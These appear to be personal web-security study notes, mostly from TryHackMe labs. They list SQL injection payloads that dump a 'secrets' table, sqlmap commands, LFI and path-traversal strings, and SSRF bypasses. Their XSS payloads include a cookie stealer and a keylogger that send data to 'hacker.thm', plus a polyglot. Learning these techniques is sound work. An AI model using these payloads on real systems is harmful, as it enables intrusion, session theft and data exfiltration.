# R

* Remember for web/general/security

<hr class="sep-both">

## OWASP

* https://owasp.org/www-project-top-ten/
* Juiceshop
* https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
* https://github.com/OWASP/wstg
* https://wiki.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
* https://github.com/OWASP/CheatSheetSeries
* https://www.zaproxy.org/
* https://github.com/OWASP/Amass

<hr class="sep-both">

## enum4linux

![Usage: Enumerating Information](https://img.shields.io/badge/usage-Enumerating%20Information-ffd700)

I don't know if there is still an `enum.exe`, because I can't find it, but you can use the tool [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) for enumerating information from Windows, and Samba hosts.

```bash
$ ./enum4linux.pl <options> <ip>
# -U : list of users
# -M : list of devices
# -S : list of shares
# -o : os data
# -i : printer data
# -v : verbose
```

<hr class="sep-both">

# Notes

* https://tryhackme.com/resources/blog/online-training-for-careers
* https://tryhackme.com/resources/blog/cyber-security-awareness-month
* There are websites on the Internet that allow you to check the reputation of an IP address to see whether it's malicious or suspicious.
  * AbuseIPDB
  * Cisco Talos Intelligence
  * https://ipinfo.io/
* https://www.virustotal.com/gui/home/upload
* https://www.hybrid-analysis.com/
* https://otx.alienvault.com/ (An open-source threat tracking system)

<hr class="sep-both">

# Learn again

* netdiscover
* https://www.sans.org/cyberaces/

<hr class="sep-both">

# SQL

* Input Box String: usual
* Input Box Non-String: when there is no quotes: `'' OR 1=1-- -`
* If you have trouble via a form (client-side verification) intercept the request
* Look into the field name to guess column names
* Update
  * none',nickName='lol
* Version
  * (SELECT banner FROM v$version)
  * sqlite_version()
    * SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
    * ',nickName=(SELECT group_concat(tbl_name, '<br>') FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
    * ',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
    * ',nickName=(SELECT group_concat(id || ":" || author || ":" || secret, '<br>') FROM secrets),email='
* https://www.kirsle.net/wizards/flask-session.cgi
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
* sqlmap -u http://10.10.55.189:5000/challenge3/login --data="username=admin&password=admin"
  --level=5 --risk=3 --dbms=sqlite --technique=b --dump
* sqlmap -u http://10.10.55.189:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump --threads 10
* https://tryhackme.com/room/sqlilab
* See tamper script

<hr class="sep-both">

## Burp

* take a request captured in the Proxy, edit it, and send the same request repeatedly as many times as we wish
* tabs per request

<hr class="sep-both">

# weeb

* https://www.base64decode.org/
* https://www.base64encode.org/
* IDOR: if accounts are unpredictable, try making two accounts, and test if you can swap with both.
* URL/source code, scripts (see network tab)...
* https://canitakeyoursubdomain.name/
* https://secalerts.co/
* https://stack.watch/
* File inclusion
  * Local File Inclusion (LFI)
    * someone make a require/import of something fetched by the user, such as LANG (ex with `$_GET["lang"]`)
    * if there are error messages, it's easy to get the path good
    * Null Byte (< PHP 5.3.4, expecting EN -> EN.php, then "EN%00" or "EN0x00" ignore the ".php")
    * `/etc/passwd%00` (bypass simple filters)
    * `....//` (bypass filter with `../` as PHP will not replace the output)
    * it's also possible that the dev force the files to be in a folder, but we simply need to make a path starting with this folder then
  * Remote File Inclusion (RFI)
    * inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on
  * Path/Directory traversal: manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory
    * file_get_contents in PHP
    * ../[...]/etc/passwd (dot-dot-slash attack)
    * ../[...]/windows/win.ini
    * It may be worth noting that the root, it its own parent, so if you don't know the path of the server, you can still get add way more "../" than needed, and add a path starting from the root.
    * https://tryhackme.com/room/fileinc (common files)
* https://tryhackme.com/room/fileinc > Remediation
* https://tryhackme.com/room/fileinc > Common steps
* https://tryhackme.com/room/fileinc
  * curl 'http://10.10.187.94/challenges/chall1.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'file=/etc/flag1' 
  * Cookie, with a username, but it could be a file instead (:
  * The server uses $_REQUEST, so even if $_GET is filtered, we can get in, but it's kinda special for a setting
  * python -m http.server
  * http://10.13.3.244:8000/file

```php
<?php

echo shell_exec("hostname");
```

* SSRF Server-Side Request Forgery
  * Exploit a server to make a request to another services, that could be located on another machine, to look for a resource usually of the attacker's choosing
    * Regular SSRF: the client see the result
    * Blind SSRF: no information returned
  * Can be used to access/map internal/inaccessible areas
  * `a?api=path` -> `b/path`
  * `a?server=my?x=&api=path` -> `server?x=original_server/path`
    * if we manage to redirect the traffic to our domain
    * we could get some credentials (ex: API keys) in the headers
  * Look at
    * URL (full URL, or partial, or a path)
    * forms

If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client.

* deny list or an allow list
  * Such as deny access to localhost which may contain server performance data or further sensitive information, bypass 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io
  * 169.254.169.254.may contains sensitive data in cloud environments
  * Allow List: allows those starting with "https://xxx.com", but you could make a domain name giving us "https://xxx.com.virus.com"
* An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address.
* A form with profile images: give a path in it
* https://tryhackme.com/room/ssrfqi

* https://tryhackme.com/room/xssgi
* XSS / Cross-site Scripting
  * malicious JavaScript gets injected into a web application with the intention of being executed by other users
  * Proof Of Concept `<script>alert('XSS');</script>`
  * Session Stealing: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
  * Key Logger: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
  * Business Logic: call something that the user would be able to call from its browser, such as an API using the client credentials
* **Reflected XSS**: in the parameters of a request, the page may execute the JavaScript payload
* **Stored XSS**: store by the application, and displayed by the website (comments, profiles, listings...). Anything where the user could input something malicious.
  * Some developers are not filtering everything. Dropdown for your age, you enter XSS, boom (the database query would fail for a int).
* **DOM Based XSS** https://tryhackme.com/room/xssgi
* **Blind XSS**: you can't see if the payload is working (ex: the admin-side website if any): hackers use a callback (https://xsshunter.com/ https://github.com/mandatoryprogrammer/xsshunter https://github.com/mandatoryprogrammer/xsshunter-express)
* If inside an input `">PoC`
* If inside a textarea `<textarea/>POC`
* If inside some javascript string `';alert('XSS');//`
* Bypass filter `<sscriptcript>alert('XSS');</sscriptcript>`
* If "<" are filtered, but we are inside a tag, then we may use functions such as "onload"...

```
Polyglots:

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```